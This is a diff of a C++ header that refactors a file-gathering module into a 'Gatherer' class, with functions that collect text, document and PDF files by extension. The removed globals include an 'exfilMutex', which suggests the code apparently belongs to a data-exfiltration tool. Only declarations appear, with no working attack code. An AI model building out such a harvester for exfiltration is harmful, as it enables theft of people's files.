@@ -3,16 +3,15 @@
 
 #include <string>
 #include <vector>
-#include <queue>
-#include <mutex>
-#include <condition_variable>
 
-extern std::queue<std::string> fileQueue;
-extern std::mutex exfilMutex;
-extern std::condition_variable cv;
-extern bool doneGathering;
-
-void gatherFiles(const std::string& directoryPath, const std::vector<std::string>& extensions);
-bool hasExtension(const std::string& filePath, const std::vector<std::string>& extensions);
+class Gatherer {
+public:
+    static void gatherFilesByExtension(const std::string& directoryPath, const std::vector<std::string>& extensions);
+    static void gatherTextFiles(const std::string& directoryPath);
+    static void gatherDocumentFiles(const std::string& directoryPath);
+    static void gatherPdfFiles(const std::string& directoryPath);
+    static void gatherAllFileTypes(const std::string& directoryPath);
+    static bool isExcluded(const std::string& path);
+};
 
 #endif // GATHERER_H
